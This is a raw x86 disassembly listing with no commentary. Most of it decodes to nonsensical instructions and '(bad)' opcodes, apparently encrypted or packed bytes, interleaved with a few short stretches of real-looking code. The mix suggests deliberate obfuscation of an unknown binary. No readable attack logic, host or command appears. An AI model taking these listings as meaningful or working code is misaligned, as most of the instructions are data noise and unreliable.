  4020e3:	inc    ecx
  4020e4:	popf   
  4020e5:	xchg   edx,eax
  4020e6:	sbb    BYTE PTR [eax+esi*4+0x31],bh
  4020ea:	ret    
  4020eb:	xchg   ebp,eax
  4020ec:	inc    edx
  4020ed:	jne    0x4020e3
  4020ef:	mov    bh,BYTE PTR [ecx-0x68]
  4020f2:	inc    ebp
  4020f3:	daa    
  4020f4:	mov    dl,0xb0
  4020f6:	outs   dx,DWORD PTR ds:[esi]
  4020f7:	add    eax,0x153d28aa
  4020fc:	xor    ch,BYTE PTR [esi+0x387af754]
  402102:	out    dx,al
  402103:	xlat   BYTE PTR ds:[ebx]
  402104:	rcl    BYTE PTR [ebx],cl
  402106:	mov    dh,0x2
  402108:	scas   eax,DWORD PTR es:[edi]
  402109:	pop    ecx
  40210a:	rcl    BYTE PTR [edi-0x43a55188],cl
  402110:	and    edi,DWORD PTR [ebp-0x4cc4eeb3]
  402116:	xor    dl,BYTE PTR [ecx+0x76]
  402119:	sti    
  40211a:	stos   BYTE PTR es:[edi],al
  40211b:	dec    esp
  40211c:	cmp    ch,bh
  40211e:	aad    0x3c
  402120:	xlat   BYTE PTR ds:[ebx]
  402121:	popa   
  402122:	inc    ecx
  402123:	scas   eax,DWORD PTR es:[edi]
  402124:	sbb    ebp,ebp
  402126:	and    BYTE PTR [ebp-0x45238c50],0xf
  40212d:	push   ds
  40212e:	or     eax,0xd9939dac
  402133:	stos   DWORD PTR es:[edi],eax
  402134:	mov    cl,0xe
  402136:	jnp    0x40210e
  402138:	jge    0x4020c3
  40213a:	jbe    0x402149
  40213c:	aaa    
  40213d:	(bad)  
  40213e:	cli    
  40213f:	lods   al,BYTE PTR ds:[esi]
  402140:	dec    esp
  402141:	sub    edi,DWORD PTR [ebp+0xac27986]
  402147:	inc    ebx
  402148:	ins    BYTE PTR es:[edi],dx
  402149:	ret    0x2702
  40214c:	pop    esp
  40214d:	sbb    BYTE PTR [ecx+0x66],dl
  402150:	sub    BYTE PTR [edx],dh
  402152:	ret    
  402153:	or     bl,BYTE PTR [ecx]
  402155:	sbb    BYTE PTR [eax+0x7d9734ca],0x0
  40215c:	enter  0x3a6f,0x75
  402160:	pop    edx
  402161:	(bad)  
  402162:	push   es
  402163:	jmp    0x4020e5
  402165:	or     ecx,edi
  402167:	in     al,dx
  402168:	mov    ch,0xa5
  40216a:	xor    eax,0xdc206414
  40216f:	mov    dh,0xa0
  402171:	retf   0xd3cc
  402174:	out    0x34,al
  402176:	push   esi
  402177:	(bad)  
  402178:	mov    cl,0xb1
  40217a:	xchg   ebx,eax
  40217b:	in     al,dx
  40217c:	call   0x1f6e:0x6ecf5688
  402183:	retf   
  402184:	arpl   WORD PTR [edi],cx
  402186:	in     al,0x50
  402188:	bound  edx,QWORD PTR ds:0xea3152f4
  40218e:	cmp    dl,BYTE PTR [ebp*1-0x4fe28bf9]
  402195:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402196:	sbb    eax,esp
  402198:	jle    0x402131
  40219a:	into   
  40219b:	jmp    0x402122
  40219d:	mov    dh,BYTE PTR [eax+0x4beea82]
  4021a3:	mov    ds:0xd284c196,al
  4021a8:	cmp    ebx,ebp
  4021aa:	xlat   BYTE PTR ds:[ebx]
  4021ab:	jo     0x402134
  4021ad:	xor    DWORD PTR [ebx-0x36624b34],0x36
  4021b4:	into   
  4021b5:	(bad)  
  4021b6:	stc    
  4021b7:	jae    0x4021a3
  4021b9:	inc    ecx
  4021ba:	xor    ecx,edi
  4021bc:	adc    eax,0x4e7f017b
  4021c1:	jbe    0x4021d8
  4021c3:	out    0xc6,al
  4021c5:	jne    0x40223a
  4021c7:	enter  0xd203,0xd7
  4021cb:	enter  0xec9c,0x78
  4021cf:	(bad)  [eax]
  4021d1:	ret    
  4021d2:	xor    BYTE PTR [esi-0x71726e36],ah
  4021d8:	dec    edx
  4021d9:	adc    dl,BYTE PTR [edx]
  4021db:	arpl   WORD PTR [bp+si],si
  4021de:	gs inc ebx
  4021e0:	pop    es
  4021e1:	jg     0x402262
  4021e3:	das    
  4021e4:	leave  
  4021e5:	pop    eax
  4021e6:	mov    edi,0x5b4cf211
  4021eb:	xlat   BYTE PTR ds:[ebx]
  4021ec:	mov    al,0xa1
  4021ee:	mov    ebp,DWORD PTR [eax]
  4021f0:	mov    bl,0xe6
  4021f2:	sbb    eax,0xc30243f3
  4021f7:	(bad)  
  4021f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021f9:	fisttp QWORD PTR [ebx]
  4021fb:	(bad)  
  4021fc:	outs   dx,BYTE PTR ds:[esi]
  4021fd:	cmovs  esp,DWORD PTR [ebp-0x20892b47]
  402204:	test   eax,0x5d31fa8f
  402209:	test   al,0xe6
  40220b:	hlt    
  40220c:	loopne 0x4021ed
  40220e:	ja     0x4021f0
  402210:	mov    dl,0x45
  402212:	mov    esp,0xa7a30eaa
  402217:	jnp    0x402243
  402219:	sti    
  40221a:	imul   ecx,DWORD PTR [ebp+0xc7b1ab4],0xffffff9d
  402221:	adc    BYTE PTR [ebx],dh
  402223:	(bad)  
  402224:	pusha  
  402225:	jmp    0x402296
  402227:	test   al,0x98
  402229:	fnstenv [edi-0x5b]
  40222c:	jg     0x4021e2
  40222e:	mov    ds:0xdcf38e11,al
  402233:	xor    al,0x75
  402235:	ss icebp 
  402237:	and    DWORD PTR [ebp+0x39324b1],0xffffff97
  40223e:	jle    0x4021e8
  402240:	das    
  402241:	sar    eax,1
  402243:	push   0xea47cb32
  402248:	(bad)  
  402249:	clc    
  40224a:	push   edx
  40224b:	mov    ebp,0xabd28a4f
  402250:	add    BYTE PTR [edi+0x71],ah
  402253:	nop
  402254:	push   0x5f
  402256:	or     bh,BYTE PTR [edx+ebx*2]
  402259:	sub    esp,DWORD PTR [esi-0x3b68d2be]
  40225f:	mov    al,ds:0x50f229c2
  402264:	mov    bl,0xc0
  402266:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402267:	dec    ebx
  402268:	jl     0x402286
  40226a:	jg     0x402226
  40226c:	inc    edx
  40226d:	iret   
  40226e:	cld    
  40226f:	jl     0x402269
  402271:	xor    BYTE PTR ds:[eax-0x2e],ch
  402275:	fisttp DWORD PTR [edi]
  402277:	test   BYTE PTR [ecx-0x74fffffc],al
  40227d:	inc    ebp
  40227e:	in     al,dx
  40227f:	xor    eax,ecx
  402281:	add    eax,esi
  402283:	mov    DWORD PTR [ebp-0x30],eax
  402286:	mov    eax,DWORD PTR [ebp-0x34]
  402289:	jmp    0x4024a6
  40228e:	jp     0x40222b
  402290:	sbb    al,0xe8
  402292:	cdq    
  402293:	ja     0x402267
  402295:	jno    0x40227a
  402297:	sbb    al,0x20
  402299:	sub    DWORD PTR ds:0x70396ec8,esi
  40229f:	add    dh,BYTE PTR [eax+0x70]
  4022a2:	jo     0x402322
  4022a4:	jo     0x402316
  4022a6:	adc    edi,DWORD PTR [esi-0x2e]
  4022a9:	enter  0xbd8,0x18
  4022ad:	mov    ch,0xfd
  4022af:	xor    eax,0x1afa7ee4
  4022b4:	gs scas eax,DWORD PTR es:[edi]
  4022b6:	inc    eax
  4022b7:	imul   edx,DWORD PTR [ecx+0x2],0xffffffaf
  4022bb:	das    
  4022bc:	stos   DWORD PTR es:[edi],eax
  4022bd:	jmp    0x4022bd
  4022bf:	jo     0x40225a
  4022c1:	mov    bh,0x3b
  4022c3:	xchg   edi,eax
  4022c4:	popf   
  4022c5:	push   eax
  4022c6:	pop    edx
  4022c7:	cmp    al,0xa6
  4022c9:	repz xchg ecx,eax
  4022cb:	lods   al,BYTE PTR ds:[esi]
  4022cc:	loopne 0x4022d0
  4022ce:	sahf   
  4022cf:	add    dl,ch
  4022d1:	cmc    
  4022d2:	lods   eax,DWORD PTR ds:[esi]
  4022d3:	jae    0x402256
  4022d5:	mov    cl,0x53
  4022d7:	mov    dh,0x6a
  4022d9:	adc    al,0x39
  4022db:	call   0xc418:0xcc2c1c88
  4022e2:	out    dx,al
  4022e3:	fldcw  WORD PTR [ebx]
  4022e5:	inc    edx
  4022e6:	(bad)  
  4022e7:	rep lods al,BYTE PTR ds:[esi]
  4022e9:	jae    0x402311
  4022eb:	dec    eax
  4022ec:	ss cli 
  4022ee:	jmp    0x402270
  4022f0:	sub    DWORD PTR [eax],esp
  4022f2:	lods   al,BYTE PTR ds:[esi]
  4022f3:	jo     0x4022dd
  4022f5:	dec    esi
  4022f6:	imul   eax,DWORD PTR [ebp+0x472aa00a],0x3
  4022fd:	stos   BYTE PTR es:[edi],al
  4022fe:	or     ch,BYTE PTR [edx-0xd]
  402301:	mov    al,0x1b
  402303:	imul   edi,DWORD PTR ds:0xf541f64a,0xeadde022
  40230d:	mov    ah,BYTE PTR [ebp-0x5f5bbff0]
  402313:	adc    eax,0x96f01ce5
  402318:	mov    BYTE PTR [ebp-0xc],dh
  40231b:	sub    eax,0xc1bd14da
  402320:	in     eax,dx
  402321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402322:	sar    DWORD PTR [ecx],cl
  402324:	out    dx,al
  402325:	(bad)  
  402326:	int3   
  402327:	shl    al,1
  402329:	mov    al,0xc4
  40232b:	jmp    0xbe73:0x403dbc0a
  402332:	and    eax,0x3cbb7baa
  402337:	xchg   ebp,eax
  402338:	mov    esi,0x51290b65
  40233d:	mov    ds:0x9766f39e,eax
  402342:	fcom   DWORD PTR [ebx+eax*2-0xd]
  402346:	jecxz  0x4022ea
  402348:	shl    dl,0xe5
  40234b:	jp     0x402315
  40234d:	adc    dh,BYTE PTR [edi-0x3d]
  402350:	inc    ebp
  402351:	outs   dx,DWORD PTR ds:[esi]
  402352:	mov    ds:0x7871c791,al
  402357:	out    0x2f,al
  402359:	ds jge 0x402393
  40235c:	mov    eax,ds:0xf31dd389
  402361:	cdq    
  402362:	fwait
  402363:	test   eax,0x3ac6fffd
  402368:	push   ecx
  402369:	xchg   ecx,eax
  40236a:	ficom  DWORD PTR [ebx+0x74]
  40236d:	lds    ebp,FWORD PTR ds:0xd25f0291
  402373:	jae    0x4023c5
  402375:	pop    ecx
  402376:	hlt    
  402377:	mov    ecx,0x4e6d90b0
  40237c:	dec    edi
  40237d:	js     0x4023bb
  40237f:	mov    edi,0x46710130
  402384:	sbb    eax,esp
  402386:	dec    eax
  402387:	push   ebp
  402388:	inc    esp
  402389:	and    esi,edi
  40238b:	mov    es,WORD PTR [edx+0x37]
  40238e:	adc    DWORD PTR [ebx+0x5265049e],0xc85f6864
  402398:	repnz pop ss
  40239a:	xchg   edx,eax
  40239b:	mov    edx,DWORD PTR [ebx]
  40239d:	mov    ah,0xe2
  40239f:	cs loop 0x4023bd
  4023a2:	and    ebp,DWORD PTR [eax+eax*2]
  4023a5:	sub    eax,0xe909341
  4023aa:	push   0xffffff83
  4023ac:	scas   eax,DWORD PTR es:[edi]
  4023ad:	ins    DWORD PTR es:[edi],dx
  4023ae:	jmp    0xe94855d4
  4023b3:	adc    DWORD PTR [ecx-0xf],0x66bba92f
  4023ba:	arpl   WORD PTR [ecx],dx
  4023bc:	push   ecx
  4023bd:	pop    edx
  4023be:	mov    edx,DWORD PTR [edi-0x2ed9e9f6]
  4023c4:	xchg   BYTE PTR [ebx-0x45ea015a],bh
  4023ca:	push   ds
  4023cb:	test   DWORD PTR [edi-0x646869b9],edi
  4023d1:	xor    eax,0x746c32e8
  4023d6:	adc    bl,BYTE PTR [ebx]
  4023d8:	ret    0x733c
  4023db:	jbe    0x40243e
  4023dd:	scas   al,BYTE PTR es:[edi]
  4023de:	int    0x2e
  4023e0:	adc    edx,edi
  4023e2:	mov    dh,0x6c
  4023e4:	xlat   BYTE PTR ds:[ebx]
  4023e5:	clc    
  4023e6:	ret    0x986b
  4023e9:	push   es
  4023ea:	rcr    DWORD PTR [ebp-0x6b45b1a0],0x7f
  4023f1:	jp     0x40238b
  4023f3:	jge    0x402406
  4023f5:	call   0x8bf1f730
  4023fa:	out    0x54,al
  4023fc:	mov    WORD PTR [ebx+eax*1+0xf],ss
  402400:	aam    0xd5
  402402:	jle    0x4023ff
  402404:	lar    edi,WORD PTR [edi+0x2e]
  402408:	cli    
  402409:	mov    bh,0xd8
  40240b:	xchg   ebp,eax
  40240c:	or     ecx,esp
  40240e:	mov    al,0x5f
  402410:	imul   ebx,edx,0x35af9cb
  402416:	xor    DWORD PTR [edx+0x55a6b401],eax
  40241c:	cwde   
  40241d:	sbb    eax,0xedc7ff9d
  402422:	int3   
  402423:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402424:	pop    esi
  402425:	xor    ch,cl
  402427:	pop    ebp
  402428:	add    bl,cl
  40242a:	imul   edx,DWORD PTR [ebp-0x410864a4],0xe3f8ef21
  402434:	fidivr DWORD PTR [eax-0x56]
  402437:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402438:	push   ebp
  402439:	mov    al,0xe3
  40243b:	mov    al,ds:0xe720a725
  402440:	test   al,0x9c
  402442:	div    BYTE PTR [eax+0x29ca3805]
  402448:	push   es
  402449:	xchg   ebx,eax
  40244a:	mov    edi,0x559f44af
  40244f:	push   es
  402450:	test   eax,0x7c5d585f
  402455:	aaa    
  402456:	popa   
  402457:	push   0xfdbf25a6
  40245c:	xchg   BYTE PTR [ecx-0x4c9335e7],al
  402462:	or     eax,0x3b8c1df4
  402467:	arpl   WORD PTR [eax-0x76],ax
  40246a:	dec    esi
  40246b:	es cmp eax,0x519715bc
  402471:	pop    edi
  402472:	xor    edx,DWORD PTR fs:[ecx]
  402475:	loop   0x40249f
  402477:	int3   
  402478:	add    DWORD PTR [edi+0x11b89a47],esp
  40247e:	push   eax
  40247f:	xchg   esi,eax
  402480:	xchg   ecx,eax
  402481:	lock mov bh,0x66
  402484:	xor    DWORD PTR [edx+0x30],eax
  402487:	fst    st(2)
  402489:	sub    eax,0xcc76a14
  40248e:	jnp    0x4024df
  402490:	dec    esp
  402491:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402492:	mov    esi,0xa0b0b413
  402497:	shr    BYTE PTR [edx-0x204988b2],1
  40249d:	xor    BYTE PTR [ebx-0x53334aa1],bh
  4024a3:	push   ebx
  4024a4:	mov    edi,0x558b6662
  4024a9:	enter  0x3ebb,0x8a
  4024ad:	add    BYTE PTR [eax],al
  4024af:	xor    dx,bx
  4024b2:	mov    ebx,DWORD PTR [ebp-0x8]
  4024b5:	add    dx,di
  4024b8:	movzx  edx,dx
  4024bb:	xor    ebx,ecx
  4024bd:	lea    edx,[edx+ebx*1+0x32729c]
  4024c4:	add    DWORD PTR [eax],edx
  4024c6:	mov    eax,DWORD PTR [ebp-0x2c]
  4024c9:	mov    edx,DWORD PTR [ebp-0x8]
  4024cc:	mov    ebx,DWORD PTR [ebp-0x30]
  4024cf:	xor    edx,ecx
  4024d1:	add    edx,esi
  4024d3:	imul   edx,ebx
  4024d6:	sub    DWORD PTR [eax],edx
  4024d8:	mov    eax,DWORD PTR [ebp-0x14]
  4024db:	jmp    0x402730
  4024e0:	jmp    0x4026fd
  4024e5:	and    DWORD PTR [edi+edi*4+0x31714d76],esi
  4024ec:	jae    0x40250e
  4024ee:	xor    BYTE PTR [ecx-0x4fcd73c9],cl
  4024f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4024f5:	jo     0x4024f7
  4024f7:	jo     0x402569
  4024f9:	jo     0x402579
  4024fb:	jo     0x40256d
  4024fd:	std    
  4024fe:	dec    DWORD PTR [edi+edi*4+0x5d]
  402502:	dec    ebx
  402503:	inc    edx
  402504:	cmp    al,0x20
  402506:	dec    ebp
  402507:	dec    eax
  402508:	push   ss
  402509:	ja     0x4024c8
  40250b:	pop    esi
  40250c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40250d:	dec    edx
  40250e:	sub    al,0x50
  402510:	int    0xcb
  402512:	mov    esi,0x366755e9
  402517:	shl    cl,1
  402519:	aaa    
  40251a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40251b:	js     0x402597
  40251d:	and    ch,BYTE PTR [ebx+0x66dec9a1]
  402523:	sbb    eax,0xbcf17b74
  402528:	mov    ds:0x2724b7d2,al
  40252e:	inc    ebx
  40252f:	pop    eax
  402530:	jg     0x40257b
  402532:	mov    ah,0x0
  402534:	imul   eax,DWORD PTR [eax-0x508b0468],0xffffff8a
  40253b:	mov    bh,0x7e
  40253d:	shl    DWORD PTR [edi+0x150d2998],0xed
  402544:	add    eax,0x3bc2cba0
  402549:	imul   eax,DWORD PTR [ebx],0x1
  40254c:	push   ss
  40254d:	mov    ebx,0x642db882
  402552:	fs and al,0x84
  402555:	adc    al,0x73
  402557:	jns    0x402510
  402559:	sbb    esi,eax
  40255b:	dec    ebp
  40255c:	push   esi
  40255d:	inc    edx
  40255e:	int3   
  40255f:	lods   eax,DWORD PTR ds:[esi]
  402560:	imul   ebx,DWORD PTR [ebx+ebp*1-0x6fa3a4f8],0xffffffde
  402568:	sti    
  402569:	data16 fdivp st(6),st
  40256c:	sub    eax,0xa9875749
  402571:	scas   eax,DWORD PTR es:[edi]
  402572:	mov    bh,0x59
  402574:	into   
  402575:	or     al,0x0
  402577:	jmp    0x3675:0x3b5e654f
  40257e:	addr16 das 
  402580:	inc    eax
  402581:	mov    BYTE PTR [ebx],bh
  402583:	shr    BYTE PTR [esi-0x1d559f99],0x7d
  40258a:	mov    dh,0x68
  40258c:	push   ecx
  40258d:	jge    0x4025df
  40258f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402590:	imul   edx,DWORD PTR [ebx],0x52
  402593:	imul   ebx,esp,0xfead63c1
  402599:	lods   eax,DWORD PTR ds:[esi]
  40259a:	ja     0x402548
  40259c:	pop    edx
  40259d:	cmp    esi,esp
  40259f:	push   cs
  4025a0:	lods   al,BYTE PTR ds:[esi]
  4025a1:	rcr    BYTE PTR [ebx-0x7babb93c],cl
  4025a7:	jne    0x402581
  4025a9:	mov    esi,0xd11813a1
  4025ae:	(bad)  
  4025af:	mov    bh,0x97
  4025b1:	repz mov esi,0x9aa71ae6
  4025b7:	adc    al,0xb
  4025b9:	mov    edi,DWORD PTR [edx+ecx*1-0x3]
  4025bd:	push   0xffffffcb
  4025bf:	xor    ch,BYTE PTR [ebp-0x2b707296]
  4025c5:	mov    WORD PTR [eax-0x12],?
  4025c8:	and    esi,DWORD PTR [edi-0x6a]
  4025cb:	cmp    eax,0x194bfb84
  4025d0:	imul   ebp,DWORD PTR [ecx-0x6bf2625b],0x6a0ffce5
  4025da:	jle    0x40263e
  4025dc:	sbb    edx,DWORD PTR [eax+0x12]
  4025df:	pop    ecx
  4025e0:	jnp    0x40262d
  4025e2:	sbb    al,0x67
  4025e4:	inc    ebx
  4025e5:	xchg   esp,eax
  4025e6:	test   al,0x6e
  4025e8:	mov    eax,ebx
  4025ea:	inc    ebp
  4025eb:	inc    ebx
  4025ec:	mov    bh,0x84
  4025ee:	sub    DWORD PTR [ebx-0x17],ebp
  4025f1:	out    dx,al
  4025f2:	add    al,0x2d
  4025f4:	dec    ecx
  4025f5:	iret   
  4025f6:	cld    
  4025f7:	xchg   ebp,eax
  4025f8:	xchg   edx,eax
  4025f9:	sbb    al,0xc7
  4025fb:	(bad)  [ecx-0x49]
  4025fe:	mov    ecx,DWORD PTR [eax-0x4d]
  402601:	arpl   WORD PTR [edi],di
  402603:	xchg   ecx,eax
  402604:	pop    DWORD PTR [ebx+0x6e]
  402607:	sub    edi,ebp
  402609:	sahf   
  40260a:	jmp    0x3c13:0xcdf8d5eb
  402611:	dec    eax
  402612:	inc    esi
  402613:	cwde   
  402614:	pop    eax
  402615:	pop    esi
  402616:	push   esi
  402617:	push   es
  402618:	dec    ebp
  402619:	push   ss
  40261a:	sub    ecx,esi
  40261c:	mov    ebx,0xf89a8e03
  402621:	dec    ebx
  402622:	ins    BYTE PTR es:[edi],dx
  402623:	mov    ecx,0xfc3a38f3
  402628:	mov    ebp,0x2ccbde98
  40262d:	iret   
  40262e:	mov    dl,0x53
  402630:	xlat   BYTE PTR ds:[ebx]
  402631:	sub    DWORD PTR [edx+ecx*2],ebp
  402634:	push   esi
  402635:	iret   
  402636:	and    BYTE PTR [edi-0x6d8835a9],ah
  40263c:	(bad)  
  40263d:	(bad)  
  40263e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40263f:	dec    edi
  402640:	push   ebp
  402641:	or     BYTE PTR [ecx],al
  402643:	es push 0x79eaf705
  402649:	add    al,ch
  40264b:	in     eax,dx
  40264c:	mov    dl,BYTE PTR es:[ebx]
  40264f:	(bad)  [edi-0x340097f5]
  402655:	arpl   WORD PTR [ecx+edx*2-0x14],cx
  402659:	imul   ebp,DWORD PTR [edx+0x73069bca],0xffffff96
  402660:	xlat   BYTE PTR ds:[ebx]
  402661:	push   ss
  402662:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402663:	(bad)  
  402665:	ss popa 
  402667:	push   cs
  402668:	lods   eax,DWORD PTR ds:[esi]
  402669:	push   cs
  40266a:	(bad)  
  40266c:	test   eax,0x86f30bd
  402671:	inc    esi
  402672:	mov    dh,0xc3
  402674:	int    0x2
  402676:	cmp    al,0x3d
  402678:	dec    ebp
  402679:	ja     0x402658
  40267b:	and    BYTE PTR [esi+eax*4-0x131f0799],dh
  402682:	add    DWORD PTR [edi-0x634db8bc],edx
  402688:	jge    0xa8becef5
  40268e:	stc    
  40268f:	jns    0x4026e2
  402691:	cwde   
  402692:	popf   
  402693:	lahf   
  402694:	push   ecx
  402695:	mov    dh,0xe
  402697:	jg     0x402653
  402699:	mov    cl,0x13
  40269b:	jae    0x402660
  40269d:	add    dl,cl
  40269f:	aas    
  4026a0:	push   ss
  4026a1:	in     eax,dx
  4026a2:	jmp    0x7603:0x525f78d3
  4026a9:	jbe    0x4026a1
  4026ab:	dec    eax
  4026ac:	mov    esp,DWORD PTR [edx]
  4026ae:	xchg   edi,eax
  4026af:	movaps xmm2,XMMWORD PTR [edx-0x14]
  4026b3:	push   esp
  4026b4:	repnz sbb eax,0xe9669eca
  4026ba:	inc    esi
  4026bb:	cld    
  4026bc:	cmp    DWORD PTR [edi+0x63361272],ecx
  4026c2:	repnz (bad) 
  4026c4:	mov    ?,WORD PTR [ebp-0xe80144d]
  4026ca:	adc    cl,BYTE PTR [ecx+0x13badc5d]
  4026d0:	addr16 mov ebx,0x71e13ed
  4026d6:	nop
  4026d7:	sahf   
  4026d8:	push   0xffffffa9
  4026da:	in     al,0x36
  4026dc:	or     al,0xf3
  4026de:	shl    edx,0xac
  4026e1:	inc    edx
  4026e2:	mov    edx,0x11fce660
  4026e7:	scas   eax,DWORD PTR es:[edi]
  4026e8:	push   ecx
  4026e9:	xor    ecx,DWORD PTR [edx+0xb9fdc98]
  4026ef:	leave  
  4026f0:	mov    dl,0xba
  4026f2:	lock inc ecx
  4026f4:	popa   
  4026f5:	add    BYTE PTR [edx+edx*8],bl
  4026f8:	scas   al,BYTE PTR es:[edi]
  4026f9:	(bad)  
  4026fa:	jnp    0x40272c
  4026fc:	xor    DWORD PTR [ebx+0x558bf445],ecx
  402702:	call   0x7d7de93a
  402707:	or     esi,DWORD PTR [esp+ecx*4+0x1d840f]
  40270e:	add    BYTE PTR [eax],al
  402710:	mov    eax,DWORD PTR [ebp-0x10]
  402713:	add    DWORD PTR [eax],0x7403501
  402719:	jmp    0x40272d
  40271e:	mov    eax,DWORD PTR [ebp-0x1c]
  402721:	cmp    DWORD PTR [eax],0xf89f2da9
  402727:	jne    0x402748
  40272d:	mov    eax,DWORD PTR [ebp-0x8]
  402730:	xor    eax,ecx
  402732:	add    eax,esi
  402734:	test   eax,eax
  402736:	jne    0x402748
  40273c:	xor    DWORD PTR [ebp-0x20],0xe149ebe
  402743:	jmp    0x4012bf
  402748:	pop    ebx
  402749:	pop    edi
  40274a:	jmp    0x402967
  40274f:	cs dec edi
  402751:	add    dl,bl
  402753:	popa   
  402754:	push   ecx
  402755:	in     eax,dx
  402756:	jno    0x4026ea
  402758:	imul   ebx,DWORD PTR [ecx+esi*8],0xcebd5888
  40275f:	jo     0x40276f
  402761:	jo     0x4027d3
  402763:	jo     0x4027e3
  402765:	jo     0x4027d7
  402767:	push   ebx
  402768:	test   DWORD PTR [ecx+eiz*4-0x2],edx
  40276c:	mov    ebx,0x47a0434c
  402771:	dec    esi
  402772:	xchg   edx,eax
  402773:	in     al,dx
  402774:	inc    esp
  402775:	out    0x31,al
  402777:	fwait
  402778:	push   es
  402779:	std    
  40277a:	cmp    esp,DWORD PTR [eax+edx*2-0x434c628b]
  402781:	adc    bl,BYTE PTR [esi+0xe8d4e7a]
  402787:	pop    ebx
  402788:	mov    edi,0x66c2ec50
  40278d:	cwde   
  40278e:	inc    eax
  40278f:	imul   ebp,DWORD PTR [ebx+edx*4+0x20b24391],0xffffffee
  402797:	xchg   esp,eax
  402798:	sub    BYTE PTR [eax+0x51],al
  40279b:	(bad)  
  40279c:	adc    al,0xed
  40279e:	cs test eax,0x3e2e643d
  4027a4:	mov    ds:0x7cb77e1a,al
  4027a9:	std    
  4027aa:	mov    esi,0x417528df
  4027af:	cwde   
  4027b0:	stos   DWORD PTR es:[edi],eax
  4027b1:	jo     0x4027cf
  4027b3:	inc    edx
  4027b4:	icebp  
  4027b5:	mov    ecx,0xbc82d019
  4027ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027bb:	sets   BYTE PTR [ebx+0x4d1c7b11]
  4027c2:	rcr    bl,cl
  4027c4:	adc    ebp,DWORD PTR [edx+0x3ea9da72]
  4027ca:	pop    esi
  4027cb:	jp     0x402828
  4027cd:	mov    eax,0x9fad741d
  4027d2:	cmp    BYTE PTR [ebx+0x3d2adc8a],0x3b
  4027d9:	test   eax,0x6dbb81d4
  4027de:	lods   eax,DWORD PTR ds:[esi]
  4027df:	dec    esp
  4027e0:	out    dx,eax
  4027e1:	mov    ds:0x4240b278,eax
  4027e6:	(bad)  
  4027e7:	out    0x14,al
  4027e9:	fdiv   DWORD PTR [esp+esi*1-0x48df7929]
  4027f0:	imul   eax,DWORD PTR [ecx-0x76],0x9cdd7607
  4027f7:	cmp    esi,edx
  4027f9:	fs jecxz 0x402835
  4027fc:	shl    DWORD PTR [edi],0xcb
  4027ff:	ins    DWORD PTR es:[edi],dx
  402800:	sbb    DWORD PTR [esi+ebx*8+0x30],ebx
  402804:	xor    al,0x73
  402806:	push   edi
  402807:	or     ebx,0x92ca6537
  40280d:	fdivr  QWORD PTR [ebx-0x308e7d4d]
  402813:	ins    BYTE PTR es:[edi],dx
  402814:	adc    cl,cl
  402816:	sub    al,0x68
  402818:	into   
  402819:	ins    BYTE PTR es:[edi],dx
  40281a:	and    BYTE PTR [ebp-0x3c],al
  40281d:	sbb    edx,DWORD PTR [ebx+0x32]
  402820:	push   es
  402821:	or     al,0xb3
  402823:	sbb    eax,0x3af889a0
  402828:	sbb    al,0x40
  40282a:	jnp    0x40289a
  40282c:	sbb    eax,0x79ff0066
  402831:	mov    esi,0xc7e45d13
  402836:	mov    cl,BYTE PTR [ebx]
  402838:	and    edi,DWORD PTR [ecx+0x4c]
  40283b:	arpl   WORD PTR [ecx],bp
  40283d:	adc    al,0xd0
  40283f:	ss std 
  402841:	mov    dh,0xd5
  402843:	ror    esi,0x44
  402846:	in     eax,0x6b
  402848:	fadd   QWORD PTR [eax+0x16]
  40284b:	arpl   bp,bx
  40284d:	mov    ch,0xdf
  40284f:	adc    edx,DWORD PTR [ebx]
  402851:	fadd   QWORD PTR [ecx]
  402853:	jle    0x4028cd
  402855:	neg    BYTE PTR [edx-0x64]
  402858:	push   ss
  402859:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40285a:	jne    0x4027e6
  40285c:	out    0x2b,al
  40285e:	sub    eax,0x6277f10f
  402863:	adc    al,0xa3
  402865:	mov    edi,0x5e3ca1df
  40286a:	ja     0x4028ab
  40286c:	ds push cs
  40286e:	das    
  40286f:	mov    ebp,0x925c9bba
  402874:	cwde   
  402875:	pop    esp
  402876:	and    dl,bl
  402878:	push   edi
  402879:	push   esp
  40287a:	fmul   DWORD PTR [ebx-0x1b]
  40287d:	arpl   WORD PTR [edi],sp
  40287f:	sub    esp,0xa4737990
  402885:	idiv   BYTE PTR ds:0xbc3aa119
  40288b:	jo     0x4028b0
  40288d:	add    al,0x5e
  40288f:	fistp  DWORD PTR [esi-0x80]
  402892:	into   
  402893:	aam    0xf
  402895:	or     eax,0x1d4a0a58
  40289a:	loop   0x4028ad
  40289c:	es pop ebp
  40289e:	mov    ebp,eax
  4028a0:	ret    
  4028a1:	and    DWORD PTR [edi],esp
  4028a3:	dec    edi
  4028a4:	or     BYTE PTR [ebx+ebp*8],ah
  4028a7:	inc    esp
  4028a8:	jnp    0x4028f0
  4028aa:	int    0xd9
  4028ac:	push   ss
  4028ad:	sahf   
  4028ae:	imul   eax,DWORD PTR [ebp-0x42f1b0c5],0x48
  4028b5:	add    edi,edx
  4028b7:	or     BYTE PTR [eax-0x7c],bl
  4028ba:	xor    BYTE PTR ss:[ebx],bl
  4028bd:	or     eax,ecx
  4028bf:	ss jp  0x402914
  4028c2:	inc    edx
  4028c3:	hlt    
  4028c4:	adc    eax,0xdbbcec18
  4028c9:	test   al,0xc7
  4028cb:	out    0xc0,al
  4028cd:	adc    al,BYTE PTR [ebx]
  4028cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028d0:	call   ebx
  4028d2:	ret    
  4028d3:	mov    ds:0xe63ecdd7,al
  4028d8:	adc    esi,DWORD PTR [esi+0x72]
  4028db:	push   eax
  4028dc:	lds    esp,FWORD PTR [eax+edx*8]
  4028df:	or     al,0x7f
